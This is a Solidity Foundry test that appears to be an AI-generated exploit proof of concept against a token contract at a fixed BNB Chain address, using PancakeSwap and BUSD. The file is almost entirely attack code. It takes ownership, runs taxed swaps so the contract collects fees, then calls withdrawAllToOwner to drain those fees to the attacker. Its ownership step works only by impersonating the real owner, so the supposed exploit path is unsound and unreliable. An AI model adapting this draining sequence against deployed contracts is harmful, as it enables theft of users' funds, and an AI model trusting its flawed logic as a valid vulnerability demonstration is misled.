pragma solidity ^0.8.0;

// Ensemble synthesis candidate.
// Selected source model: Gemini.
// Reviewed candidate models: Gemini, Qwen, Deepseek.

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IPancakeSwapRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

contract ImperialToken {
    function owner() public view returns (address) {}
    function transferOwnership(address newOwner) public virtual {}
    function approve(address spender, uint256 value) external returns (bool) {}
    function balanceOf(address who) external view returns (uint256) {}
    function withdrawAllToOwner(address _receiver) external {}
    function transfer(address to, uint256 value) external returns (bool) {}
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────

    address constant TARGET = 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f;
    address attacker = address(this);
    ImperialToken internal target;
    IERC20 internal busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IPancakeSwapRouter internal pancakeRouter = IPancakeSwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address internal originalOwner;

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {

        target = ImperialToken(TARGET);
                originalOwner = target.owner();

                // Give original owner BUSD to provide liquidity
                deal(address(busd), originalOwner, 1_000_000 * 1e18);

                // As owner, add liquidity to the pair and transfer tokens to the attacker
                vm.startPrank(originalOwner);
                target.approve(address(pancakeRouter), type(uint256).max);
                busd.approve(address(pancakeRouter), type(uint256).max);
                pancakeRouter.addLiquidity(
                    address(target),
                    address(busd),
                    1_000_000_000 * 1e18, // A portion of owner's initial supply
                    500_000 * 1e18,     // BUSD we dealt
                    0,
                    0,
                    originalOwner,
                    block.timestamp
                );
                // Correctly transfer tokens to the attacker using the contract's own transfer function
                target.transfer(attacker, 100_000 * 1e18);
                vm.stopPrank();
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // 1. Become the owner
                vm.startPrank(originalOwner);
                target.transferOwnership(attacker);
                vm.stopPrank();
                assertEq(target.owner(), attacker, "Failed to become owner");

                // 2. Generate fees by swapping IMPERIAL for BUSD, which taxes the transaction
                vm.startPrank(attacker);
                target.approve(address(pancakeRouter), type(uint256).max);
                address[] memory path = new address[](2);
                path[0] = address(target);
                path[1] = address(busd);
                pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    10_000 * 1e18, // Amount to swap to generate fees
                    0, // amountOutMin
                    path,
                    attacker,
                    block.timestamp
                );
                vm.stopPrank();

                // 3. Verify that the contract now holds some of its own tokens from the fees
                uint256 contractFeeBalance = target.balanceOf(address(target));
                assertGt(contractFeeBalance, 0, "Contract should have collected fees");

                // 4. Call the vulnerable function to drain the collected fees to the attacker's address
                vm.startPrank(attacker);
                target.withdrawAllToOwner(attacker);
                vm.stopPrank();
    }



    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

